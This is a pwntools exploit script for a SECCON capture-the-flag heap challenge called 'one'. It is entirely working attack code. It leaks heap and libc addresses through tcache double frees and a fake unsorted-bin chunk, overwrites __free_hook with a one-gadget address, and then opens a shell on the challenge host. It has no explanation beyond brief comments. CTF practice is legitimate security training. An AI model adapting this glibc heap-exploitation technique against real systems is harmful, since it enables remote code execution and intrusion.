#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./one"

rhp1 = {"host":"one.chal.seccon.jp","port":18357}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF("./libc-2.27.so")

diff_arena_printf = 0x386dc0
onegadgets = [0x4f2c5,0x4f322,0x10a38c]

def add(conn,content):
  if(len(content)>=0x40):
    print("[!]too large content")
    return
  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("> ")
  conn.sendline(content)

def delete(conn):
  conn.recvuntil("> ")
  conn.sendline("3")

def show(conn):
  conn.recvuntil("> ")
  conn.sendline("2")

def exploit(conn):

  #
  small_chunks = 0x10
  size = 0x40+ 0x50*small_chunks- 0x10 #最後の0x10byteは次のchunkのヘッダをごまかすため

  add(conn,p64(0)+p64((size+0x10)|0x1) + p64(0)*2) #large fake chunk size
  for i in range(small_chunks):
    add(conn,"A"*0x30 + p64(size|0x1) + p64(0x61)[:-2])
  
  add(conn,"B"*0x30)
  delete(conn)
  delete(conn)
  delete(conn)

  #leak heap addr
  show(conn)
  data = unpack(conn.recvline()[:-1].ljust(8,"\x00")[0:8])
  large_chunk_usr = data - 0x50*(small_chunks+1) + 0x10
  print("[+]data: "+hex(data))
  print("[+]large chunk usr: "+hex(large_chunk_usr))

  #make point to large chunk
  add(conn,p64(large_chunk_usr)+p64(0)*2)
  add(conn,p64(0)*2)
  add(conn,p64(0)*2) #large fake chunk

  #create unsortedbin
  delete(conn)
  
  #leak libc_base
  show(conn)
  mainarena = unpack(conn.recvline()[:-1].ljust(8,"\x00")[0:8]) - 96
  print("[!]main_arena: "+hex(mainarena))
  libc_base = mainarena-diff_arena_printf-libc.functions["printf"].address
  print("[!]libc_base: "+hex(libc_base))

  #overwrite __malloc_hook
  add(conn,"D"*0x20)
  delete(conn)
  delete(conn)
  delete(conn)
  #show(conn)
  #data = unpack(conn.recvline()[:-1].ljust(8,"\x00")[0:8])
  #print("[+]data: "+hex(data))
  add(conn,p64(libc_base + libc.symbols["__free_hook"])+p64(0))
  add(conn,p64(0)*2)
  add(conn,p64(libc_base + onegadgets[1]))

  #get the shell
  conn.recvuntil("> ")
  conn.sendline("3")

  return


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

